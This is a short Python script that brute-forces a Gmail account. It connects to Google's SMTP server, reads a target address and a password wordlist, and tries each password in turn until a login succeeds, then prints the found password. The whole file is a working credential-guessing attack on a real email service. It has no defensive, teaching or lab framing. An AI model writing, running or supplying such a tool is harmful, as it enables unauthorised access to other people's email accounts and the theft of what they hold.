import smtplib
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter email address")
passfile = raw_input("Enter the password file name ")
passfile = open(passfile, "r")

for password in passfile:

    try:
        smtpserver.login(user, password)

        print ("PASSWORD IS FOUND : %s" % password)
        break

    except smtplib.SMTPAuthenticationError:

        print("[!] Incorrect %s" % password)

